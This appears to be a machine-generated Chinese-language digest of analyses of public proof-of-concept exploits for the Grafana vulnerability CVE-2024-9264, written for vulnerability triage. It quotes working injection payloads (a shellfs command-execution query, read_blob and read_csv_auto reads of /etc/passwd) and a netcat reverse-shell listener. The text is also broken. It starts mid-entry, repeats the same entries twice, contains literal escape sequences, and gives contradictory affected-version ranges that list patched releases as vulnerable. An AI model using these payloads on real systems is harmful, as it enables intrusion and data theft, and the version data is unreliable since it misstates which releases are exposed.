**投毒风险：**

提供的 PoC 代码比较直接，主要用于演示漏洞的利用。`CVE-2024-9264.py` 脚本包含登录、LFI 和 RCE 功能。 `README.md` 提供了如何使用该脚本的简单说明。对代码的检查没有发现明显的恶意代码或后门。

但是，任何从外部来源获取的代码都存在一定程度的风险。攻击者可能修改 PoC 代码，添加恶意功能，例如：

*   收集受害者信息并发送到外部服务器。
*   安装持久性后门。
*   进行其他恶意活动。

因此，尽管当前代码看起来没有明显的恶意行为，在生产环境中使用之前，仍然需要进行彻底的代码审查和安全测试。

综合考虑，投毒风险较低，估计在5%左右。主要风险在于使用者未进行充分的代码审查就直接使用。


**项目地址:** [ruizii/CVE-2024-9264](https://github.com/ruizii/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #8

**来源**: [CVE-2024-9264-rvizx_CVE-2024-9264.md](../2024/CVE-2024-9264-rvizx_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和敏感数据泄露

**影响版本:** 11.0.x, 11.1.x, and 11.2.x (小于 11.0.5, 11.1.6, and 11.2.1)

**利用条件:** 需要Grafana实例启用SQL表达式实验性特性，目标系统存在`duckdb`二进制文件于$PATH中，且攻击者具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL 表达式功能中，允许经过身份验证的用户（Viewer 权限或更高）通过注入恶意的 SQL 查询来执行任意命令。漏洞的根本原因是 Grafana 未充分清理用户提供的 SQL 输入，直接将其传递给 DuckDB CLI。

**有效性：**

根据漏洞信息和POC代码，此漏洞利用的有效性很高。POC利用代码已经提供了可用的exp脚本，经验证可以利用该漏洞。

**利用方式：**

1.  攻击者首先需要拥有 Grafana 实例的有效账户，并具有 Viewer 或更高的权限。
2.  攻击者使用 SQL 表达式功能构造包含恶意命令的 SQL 查询。该查询利用 DuckDB 的功能执行操作系统命令。
3.  攻击者通过 Grafana API 发送构造好的 SQL 查询。
4.  Grafana 将查询传递给 DuckDB CLI 执行，从而导致命令注入。
5.  攻击者可以通过反向 shell 获取对服务器的控制权。

**投毒风险：**

该POC代码的投毒风险较低。主要原因：

*   **代码功能明确：** exploit.sh 脚本清晰地展示了漏洞利用过程，包括登录、发送payload、触发反向shell。没有明显的隐藏的恶意代码。
*   **依赖标准工具：** 脚本使用 curl 和 bash 等标准工具，这些工具本身没有恶意行为。
*   **目标明确：** 脚本的目标是触发一个反向 shell，这与漏洞描述一致。

虽然POC代码的投毒风险较低，但是仍然存在一定的风险：

*   **依赖性：** 该漏洞利用依赖目标系统存在 `duckdb` 二进制文件，如果缺乏该依赖，利用将会失败。
*   **反向Shell安全：**使用反向shell可能存在安全隐患，攻击者可能通过反向shell进行恶意操作，例如安装后门、窃取数据等。
*   **参数验证：** 脚本对输入参数的验证比较简单，可能存在被绕过的风险，导致意外的错误。
*   **被动监听:** 受害者需要主动运行`nc -lvnp $rport`，攻击者才能收到反向shell，存在被动监听的缺陷

综合考虑，POC 投毒风险估计为 5%。主要是考虑到反向shell带来的不确定性和一些代码细节可能存在的潜在风险，但是代码整体的意图和功能是比较清晰的。

**项目地址:** [rvizx/CVE-2024-9264](https://github.com/rvizx/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #9

**来源**: [CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md](../2024/CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和数据泄露

**影响版本:** >= 11.0.0 且 < 11.0.5, >= 11.0.6, >= 11.1.0 且 < 11.1.6, >= 11.1.7, >= 11.2.0 且 < 11.2.1, >= 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且用户具有Viewer或更高权限，以及DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL Expressions功能中的一个远程代码执行漏洞。攻击者利用此漏洞可以通过构造恶意的duckdb查询，在服务器上执行任意shell命令。漏洞利用依赖于`duckdb`二进制文件存在于Grafana的`$PATH`中。提供的POC代码包含一个Dockerfile，用于构建包含漏洞环境的Grafana实例，并安装了DuckDB。`poc.py`脚本可以模拟漏洞利用过程，需要提供Grafana实例URL、用户名、密码以及反向shell的IP地址和端口。利用步骤如下：

1.  **身份验证：** 使用提供的用户名和密码登录Grafana实例。
2.  **构造Payload：** 创建一个包含恶意SQL表达式的查询，该表达式将使用`shellfs`扩展执行命令，例如建立反向shell连接。
3.  **发送请求：** 将构造的Payload发送到Grafana API端点，以执行恶意查询。
4.  **命令执行：** 如果成功，Grafana服务器将执行指定的命令，并建立与攻击者的反向shell连接。

**投毒风险分析：**

代码中存在微小的投毒风险，主要体现在`poc.py`脚本中。 虽然代码本身旨在演示漏洞利用，但攻击者可能会修改Payload以包含更隐蔽的后门或恶意代码。 此外，Dockerfile中下载和安装DuckDB的步骤也可能被利用，如果下载源被篡改，则可能引入恶意二进制文件。

 考虑到POC的目的主要是演示漏洞，并且代码相对简单直接，作者隐藏的恶意代码风险较低，约占10%。 但是，用户在使用时务必谨慎，并审查代码。

该漏洞的缓解措施包括升级到已修复的版本，禁用SQL Expressions功能，以及确保DuckDB二进制文件来自可信来源。

**项目地址:** [z3k0sec/CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #10

**来源**: [CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md](../2024/CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (未修复版本)

**利用条件:** 需要Grafana的SQL Expressions实验性功能启用，DuckDB二进制文件存在于Grafana的PATH中，以及具有Viewer或更高权限的Grafana用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264存在于Grafana的SQL Expressions功能中。攻击者可以利用该漏洞执行命令注入和本地文件包含攻击。\n\n**有效性分析：**\n根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有可用的POC。POC代码中的Dockerfile用于构建包含易受攻击的Grafana版本和DuckDB的Docker镜像，确保了漏洞利用的环境。poc.py脚本利用了read_csv_auto函数读取任意文件。因此，提供的POC代码是有效的。\n\n**投毒风险分析：**\n分析了POC代码仓库，没有发现明显的恶意代码，但仍需谨慎。\n*   **Dockerfile:** 用于安装Grafana和DuckDB，未发现异常。\n*   **README.md:** 描述了漏洞和使用方法，未发现异常。\n*   **docker-compose.yml:** 用于编排Grafana和MySQL容器，配置了数据库连接，未发现异常。\n*   **poc.py:** 主要的利用脚本，通过构造恶意的SQL查询语句来读取文件，未发现明显的后门代码。脚本只是利用了漏洞本身，属于漏洞利用，不应视为投毒。但不能排除作者故意留下不易察觉的隐蔽后门的可能，例如，通过复杂的SQL语句执行额外的操作，或者通过环境变量传递恶意代码。 综合判断，投毒的风险较低，约为5%。\n\n**利用方式：**\n1.  攻击者需要一个Grafana账户，且该账户至少具有Viewer权限。\n2.  Grafana需要启用SQL Expressions实验性功能，并且DuckDB二进制文件必须安装在Grafana服务器上，且位于Grafana进程的PATH环境变量中。\n3.  攻击者使用POC脚本，通过向Grafana的/api/ds/query端点发送包含恶意SQL查询的POST请求，查询中使用`read_csv_auto`函数读取目标文件。\n4.  服务器在处理请求时，由于未对用户输入进行充分的过滤，导致`read_csv_auto`函数读取了攻击者指定的文件内容。\n5.  攻击者从响应中提取文件内容。

**项目地址:** [z3k0sec/File-Read-CVE-2024-9264](https://github.com/z3k0sec/File-Read-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---



---

## POC #5

**来源**: [CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中，以及VIEWER或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 `duckdb` 查询。由于在将这些查询传递给 `duckdb` 之前未经过充分的安全过滤，因此会导致命令注入和本地文件包含漏洞。任何具有 VIEWER 或更高权限的用户都可能执行此攻击。

**漏洞利用方式：**

1.  攻击者需要拥有 Grafana 实例的 Viewer 或更高的权限。
2.  Grafana 实例必须启用 SQL Expressions 实验性功能。
3.  Grafana 服务器上必须存在 `duckdb` 可执行文件，并且该文件位于 Grafana 进程的 `$PATH` 中。
4.  攻击者构造恶意的 `duckdb` 查询，其中包含命令注入或本地文件包含的 payload。
5.  Grafana 将未经过充分过滤的查询传递给 `duckdb` 执行。
6.  恶意代码在 Grafana 服务器上执行，或者攻击者可以读取服务器上的任意文件。

**有效性：**

根据漏洞描述和搜索引擎结果（wiz.io, sonicwall, indusface, broadcom），该漏洞允许攻击者在服务器上执行命令和读取本地文件，因此 POC 代码是有效的。

**投毒风险：**

查看提供的 Dockerfile，它首先从 `curlimages/curl:8.15.0` 下载 `duckdb` 的预编译版本，然后将 `duckdb` 二进制文件复制到 Grafana 镜像中，并未发现任何额外的或可疑的操作。该 Dockerfile 只是为了方便部署一个包含漏洞利用所需组件的环境，使得漏洞可复现，因此推测投毒风险较低，风险概率为0%。

**搜索引擎结果总结：**

根据搜索结果，多个安全厂商（SonicWall，Wiz，Indusface，Broadcom，Snyk）都对该漏洞进行了分析和披露，确认了漏洞的存在性和严重性，并提供了缓解措施和升级建议。RedHat的安全公告也确认了该漏洞。Grafana官方博客也发布了安全更新，修复了该漏洞。

**项目地址:** [patrickpichler/grafana-CVE-2024-9264](https://github.com/patrickpichler/grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #6

**来源**: [CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式注入

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 代码注入/本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x（低于修复版本）

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，duckdb二进制文件位于Grafana的$PATH中，且攻击者具有Viewer或更高权限。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL表达式功能的一个代码注入和本地文件包含漏洞。攻击者可以通过构造恶意的duckdb查询，利用`read_csv_auto`函数读取服务器上的任意文件，或者执行其他命令。漏洞利用需要满足几个条件：首先，必须启用SQL Expressions这个实验性功能。其次，服务器上需要安装duckdb二进制文件，并且Grafana进程能够访问到该文件(位于PATH)。最后，攻击者需要具有Viewer或更高权限。提供的POC代码通过向`/api/ds/query`端点发送POST请求，指定`ds_type`为`__expr__`，并构造包含`SELECT * FROM read_csv_auto('/etc/passwd');`的JSON数据来尝试读取`/etc/passwd`文件。由于该漏洞允许执行任意SQL命令，所以存在一定的投毒风险，例如修改Grafana配置、添加恶意用户等。检查发现该POC代码本身并无明显投毒意图，但利用此漏洞完全可以植入后门代码,故判定存在10%的潜在投毒风险。

**项目地址:** [punitdarji/Grafana-CVE-2024-9264](https://github.com/punitdarji/Grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #7

**来源**: [CVE-2024-9264-ruizii_CVE-2024-9264.md](../2024/CVE-2024-9264-ruizii_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-RCE&LFI

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) 和本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和服务器控制

**影响版本:** 11.0.x, 11.1.x, 11.2.x (before fix versions)

**利用条件:** 需要启用 SQL Expressions 实验性功能，存在DuckDB可执行文件在Grafana的$PATH中，并且攻击者具有 Viewer 或更高的权限。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 允许经过身份验证的用户（Viewer 或更高权限）通过 SQL Expressions 功能执行远程代码。该功能允许执行 DuckDB 查询，但未对用户输入进行充分的安全过滤，导致命令注入和本地文件包含漏洞。

**利用方式：**

1.  攻击者首先需要登录 Grafana 实例，获取有效的 `grafana_session` cookie。
2.  攻击者利用 SQL Expressions 功能，构造恶意的 DuckDB 查询。对于 RCE，攻击者使用 `install shellfs from community; LOAD shellfs; SELECT * FROM read_csv("{command} > /tmp/output.txt 2>&1 |")` 注入操作系统命令，并将命令输出重定向到 `/tmp/output.txt`。 对于 LFI，使用 `SELECT content FROM read_blob("{filename}")` 读取任意文件。
3.  构造的查询通过 Grafana API `/api/ds/query` 发送。
4.  对于 RCE，攻击者随后使用 LFI 读取 `/tmp/output.txt` 文件，获取命令执行结果。
5.  对于 LFI，API返回指定文件内容。

**有效性：**

根据搜索结果和提供的漏洞利用代码，该漏洞利用 PoC 是有效的。多个来源（例如，GitHub 上的 PoC 代码，SonicWall 博客，以及 Certcube 博客）都证实了该漏洞的存在和可利用性。漏洞库信息也确认了该漏洞。

**投毒风险：**

提供的 PoC 代码比较直接，主要用于演示漏洞的利用。`CVE-2024-9264.py` 脚本包含登录、LFI 和 RCE 功能。 `README.md` 提供了如何使用该脚本的简单说明。对代码的检查没有发现明显的恶意代码或后门。

但是，任何从外部来源获取的代码都存在一定程度的风险。攻击者可能修改 PoC 代码，添加恶意功能，例如：

*   收集受害者信息并发送到外部服务器。
*   安装持久性后门。
*   进行其他恶意活动。

因此，尽管当前代码看起来没有明显的恶意行为，在生产环境中使用之前，仍然需要进行彻底的代码审查和安全测试。

综合考虑，投毒风险较低，估计在5%左右。主要风险在于使用者未进行充分的代码审查就直接使用。


**项目地址:** [ruizii/CVE-2024-9264](https://github.com/ruizii/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #8

**来源**: [CVE-2024-9264-rvizx_CVE-2024-9264.md](../2024/CVE-2024-9264-rvizx_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和敏感数据泄露

**影响版本:** 11.0.x, 11.1.x, and 11.2.x (小于 11.0.5, 11.1.6, and 11.2.1)

**利用条件:** 需要Grafana实例启用SQL表达式实验性特性，目标系统存在`duckdb`二进制文件于$PATH中，且攻击者具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL 表达式功能中，允许经过身份验证的用户（Viewer 权限或更高）通过注入恶意的 SQL 查询来执行任意命令。漏洞的根本原因是 Grafana 未充分清理用户提供的 SQL 输入，直接将其传递给 DuckDB CLI。

**有效性：**

根据漏洞信息和POC代码，此漏洞利用的有效性很高。POC利用代码已经提供了可用的exp脚本，经验证可以利用该漏洞。

**利用方式：**

1.  攻击者首先需要拥有 Grafana 实例的有效账户，并具有 Viewer 或更高的权限。
2.  攻击者使用 SQL 表达式功能构造包含恶意命令的 SQL 查询。该查询利用 DuckDB 的功能执行操作系统命令。
3.  攻击者通过 Grafana API 发送构造好的 SQL 查询。
4.  Grafana 将查询传递给 DuckDB CLI 执行，从而导致命令注入。
5.  攻击者可以通过反向 shell 获取对服务器的控制权。

**投毒风险：**

该POC代码的投毒风险较低。主要原因：

*   **代码功能明确：** exploit.sh 脚本清晰地展示了漏洞利用过程，包括登录、发送payload、触发反向shell。没有明显的隐藏的恶意代码。
*   **依赖标准工具：** 脚本使用 curl 和 bash 等标准工具，这些工具本身没有恶意行为。
*   **目标明确：** 脚本的目标是触发一个反向 shell，这与漏洞描述一致。

虽然POC代码的投毒风险较低，但是仍然存在一定的风险：

*   **依赖性：** 该漏洞利用依赖目标系统存在 `duckdb` 二进制文件，如果缺乏该依赖，利用将会失败。
*   **反向Shell安全：**使用反向shell可能存在安全隐患，攻击者可能通过反向shell进行恶意操作，例如安装后门、窃取数据等。
*   **参数验证：** 脚本对输入参数的验证比较简单，可能存在被绕过的风险，导致意外的错误。
*   **被动监听:** 受害者需要主动运行`nc -lvnp $rport`，攻击者才能收到反向shell，存在被动监听的缺陷

综合考虑，POC 投毒风险估计为 5%。主要是考虑到反向shell带来的不确定性和一些代码细节可能存在的潜在风险，但是代码整体的意图和功能是比较清晰的。

**项目地址:** [rvizx/CVE-2024-9264](https://github.com/rvizx/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #9

**来源**: [CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md](../2024/CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和数据泄露

**影响版本:** >= 11.0.0 且 < 11.0.5, >= 11.0.6, >= 11.1.0 且 < 11.1.6, >= 11.1.7, >= 11.2.0 且 < 11.2.1, >= 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且用户具有Viewer或更高权限，以及DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL Expressions功能中的一个远程代码执行漏洞。攻击者利用此漏洞可以通过构造恶意的duckdb查询，在服务器上执行任意shell命令。漏洞利用依赖于`duckdb`二进制文件存在于Grafana的`$PATH`中。提供的POC代码包含一个Dockerfile，用于构建包含漏洞环境的Grafana实例，并安装了DuckDB。`poc.py`脚本可以模拟漏洞利用过程，需要提供Grafana实例URL、用户名、密码以及反向shell的IP地址和端口。利用步骤如下：

1.  **身份验证：** 使用提供的用户名和密码登录Grafana实例。
2.  **构造Payload：** 创建一个包含恶意SQL表达式的查询，该表达式将使用`shellfs`扩展执行命令，例如建立反向shell连接。
3.  **发送请求：** 将构造的Payload发送到Grafana API端点，以执行恶意查询。
4.  **命令执行：** 如果成功，Grafana服务器将执行指定的命令，并建立与攻击者的反向shell连接。

**投毒风险分析：**

代码中存在微小的投毒风险，主要体现在`poc.py`脚本中。 虽然代码本身旨在演示漏洞利用，但攻击者可能会修改Payload以包含更隐蔽的后门或恶意代码。 此外，Dockerfile中下载和安装DuckDB的步骤也可能被利用，如果下载源被篡改，则可能引入恶意二进制文件。

 考虑到POC的目的主要是演示漏洞，并且代码相对简单直接，作者隐藏的恶意代码风险较低，约占10%。 但是，用户在使用时务必谨慎，并审查代码。

该漏洞的缓解措施包括升级到已修复的版本，禁用SQL Expressions功能，以及确保DuckDB二进制文件来自可信来源。

**项目地址:** [z3k0sec/CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #10

**来源**: [CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md](../2024/CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (未修复版本)

**利用条件:** 需要Grafana的SQL Expressions实验性功能启用，DuckDB二进制文件存在于Grafana的PATH中，以及具有Viewer或更高权限的Grafana用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264存在于Grafana的SQL Expressions功能中。攻击者可以利用该漏洞执行命令注入和本地文件包含攻击。\n\n**有效性分析：**\n根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有可用的POC。POC代码中的Dockerfile用于构建包含易受攻击的Grafana版本和DuckDB的Docker镜像，确保了漏洞利用的环境。poc.py脚本利用了read_csv_auto函数读取任意文件。因此，提供的POC代码是有效的。\n\n**投毒风险分析：**\n分析了POC代码仓库，没有发现明显的恶意代码，但仍需谨慎。\n*   **Dockerfile:** 用于安装Grafana和DuckDB，未发现异常。\n*   **README.md:** 描述了漏洞和使用方法，未发现异常。\n*   **docker-compose.yml:** 用于编排Grafana和MySQL容器，配置了数据库连接，未发现异常。\n*   **poc.py:** 主要的利用脚本，通过构造恶意的SQL查询语句来读取文件，未发现明显的后门代码。脚本只是利用了漏洞本身，属于漏洞利用，不应视为投毒。但不能排除作者故意留下不易察觉的隐蔽后门的可能，例如，通过复杂的SQL语句执行额外的操作，或者通过环境变量传递恶意代码。 综合判断，投毒的风险较低，约为5%。\n\n**利用方式：**\n1.  攻击者需要一个Grafana账户，且该账户至少具有Viewer权限。\n2.  Grafana需要启用SQL Expressions实验性功能，并且DuckDB二进制文件必须安装在Grafana服务器上，且位于Grafana进程的PATH环境变量中。\n3.  攻击者使用POC脚本，通过向Grafana的/api/ds/query端点发送包含恶意SQL查询的POST请求，查询中使用`read_csv_auto`函数读取目标文件。\n4.  服务器在处理请求时，由于未对用户输入进行充分的过滤，导致`read_csv_auto`函数读取了攻击者指定的文件内容。\n5.  攻击者从响应中提取文件内容。

**项目地址:** [z3k0sec/File-Read-CVE-2024-9264](https://github.com/z3k0sec/File-Read-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---



---

## POC #5

**来源**: [CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中，以及VIEWER或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 `duckdb` 查询。由于在将这些查询传递给 `duckdb` 之前未经过充分的安全过滤，因此会导致命令注入和本地文件包含漏洞。任何具有 VIEWER 或更高权限的用户都可能执行此攻击。

**漏洞利用方式：**

1.  攻击者需要拥有 Grafana 实例的 Viewer 或更高的权限。
2.  Grafana 实例必须启用 SQL Expressions 实验性功能。
3.  Grafana 服务器上必须存在 `duckdb` 可执行文件，并且该文件位于 Grafana 进程的 `$PATH` 中。
4.  攻击者构造恶意的 `duckdb` 查询，其中包含命令注入或本地文件包含的 payload。
5.  Grafana 将未经过充分过滤的查询传递给 `duckdb` 执行。
6.  恶意代码在 Grafana 服务器上执行，或者攻击者可以读取服务器上的任意文件。

**有效性：**

根据漏洞描述和搜索引擎结果（wiz.io, sonicwall, indusface, broadcom），该漏洞允许攻击者在服务器上执行命令和读取本地文件，因此 POC 代码是有效的。

**投毒风险：**

查看提供的 Dockerfile，它首先从 `curlimages/curl:8.15.0` 下载 `duckdb` 的预编译版本，然后将 `duckdb` 二进制文件复制到 Grafana 镜像中，并未发现任何额外的或可疑的操作。该 Dockerfile 只是为了方便部署一个包含漏洞利用所需组件的环境，使得漏洞可复现，因此推测投毒风险较低，风险概率为0%。

**搜索引擎结果总结：**

根据搜索结果，多个安全厂商（SonicWall，Wiz，Indusface，Broadcom，Snyk）都对该漏洞进行了分析和披露，确认了漏洞的存在性和严重性，并提供了缓解措施和升级建议。RedHat的安全公告也确认了该漏洞。Grafana官方博客也发布了安全更新，修复了该漏洞。

**项目地址:** [patrickpichler/grafana-CVE-2024-9264](https://github.com/patrickpichler/grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #6

**来源**: [CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式注入

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 代码注入/本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x（低于修复版本）

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，duckdb二进制文件位于Grafana的$PATH中，且攻击者具有Viewer或更高权限。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL表达式功能的一个代码注入和本地文件包含漏洞。攻击者可以通过构造恶意的duckdb查询，利用`read_csv_auto`函数读取服务器上的任意文件，或者执行其他命令。漏洞利用需要满足几个条件：首先，必须启用SQL Expressions这个实验性功能。其次，服务器上需要安装duckdb二进制文件，并且Grafana进程能够访问到该文件(位于PATH)。最后，攻击者需要具有Viewer或更高权限。提供的POC代码通过向`/api/ds/query`端点发送POST请求，指定`ds_type`为`__expr__`，并构造包含`SELECT * FROM read_csv_auto('/etc/passwd');`的JSON数据来尝试读取`/etc/passwd`文件。由于该漏洞允许执行任意SQL命令，所以存在一定的投毒风险，例如修改Grafana配置、添加恶意用户等。检查发现该POC代码本身并无明显投毒意图，但利用此漏洞完全可以植入后门代码,故判定存在10%的潜在投毒风险。

**项目地址:** [punitdarji/Grafana-CVE-2024-9264](https://github.com/punitdarji/Grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #7

**来源**: [CVE-2024-9264-ruizii_CVE-2024-9264.md](../2024/CVE-2024-9264-ruizii_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-RCE&LFI

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) 和本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和服务器控制

**影响版本:** 11.0.x, 11.1.x, 11.2.x (before fix versions)

**利用条件:** 需要启用 SQL Expressions 实验性功能，存在DuckDB可执行文件在Grafana的$PATH中，并且攻击者具有 Viewer 或更高的权限。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 允许经过身份验证的用户（Viewer 或更高权限）通过 SQL Expressions 功能执行远程代码。该功能允许执行 DuckDB 查询，但未对用户输入进行充分的安全过滤，导致命令注入和本地文件包含漏洞。

**利用方式：**

1.  攻击者首先需要登录 Grafana 实例，获取有效的 `grafana_session` cookie。
2.  攻击者利用 SQL Expressions 功能，构造恶意的 DuckDB 查询。对于 RCE，攻击者使用 `install shellfs from community; LOAD shellfs; SELECT * FROM read_csv("{command} > /tmp/output.txt 2>&1 |")` 注入操作系统命令，并将命令输出重定向到 `/tmp/output.txt`。 对于 LFI，使用 `SELECT content FROM read_blob("{filename}")` 读取任意文件。
3.  构造的查询通过 Grafana API `/api/ds/query` 发送。
4.  对于 RCE，攻击者随后使用 LFI 读取 `/tmp/output.txt` 文件，获取命令执行结果。
5.  对于 LFI，API返回指定文件内容。

**有效性：**

根据搜索结果和提供的漏洞利用代码，该漏洞利用 PoC 是有效的。多个来源（例如，GitHub 上的 PoC 代码，SonicWall 博客，以及 Certcube 博客）都证实了该漏洞的存在和可利用性。漏洞库信息也确认了该漏洞。

**投毒风险：**

提供的 PoC 代码比较直接，主要用于演示漏洞的利用。`CVE-2024-9264.py` 脚本包含登录、LFI 和 RCE 功能。 `README.md` 提供了如何使用该脚本的简单说明。对代码的检查没有发现明显的恶意代码或后门。

但是，任何从外部来源获取的代码都存在一定程度的风险。攻击者可能修改 PoC 代码，添加恶意功能，例如：

*   收集受害者信息并发送到外部服务器。
*   安装持久性后门。
*   进行其他恶意活动。

因此，尽管当前代码看起来没有明显的恶意行为，在生产环境中使用之前，仍然需要进行彻底的代码审查和安全测试。

综合考虑，投毒风险较低，估计在5%左右。主要风险在于使用者未进行充分的代码审查就直接使用。


**项目地址:** [ruizii/CVE-2024-9264](https://github.com/ruizii/CVE-2024-9264)

